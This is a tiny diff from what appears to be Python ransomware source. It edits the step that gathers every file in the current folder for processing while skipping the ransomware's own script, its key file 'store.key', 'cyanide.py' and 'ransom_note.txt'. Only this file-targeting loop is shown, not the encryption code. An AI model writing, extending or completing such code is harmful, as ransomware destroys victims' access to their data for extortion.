@@ -9,7 +9,7 @@ files = []
 
 
 for file in os.listdir():
-    if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt":
+    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt":
         continue
     if os.path.isfile(file):
         files.append(file)
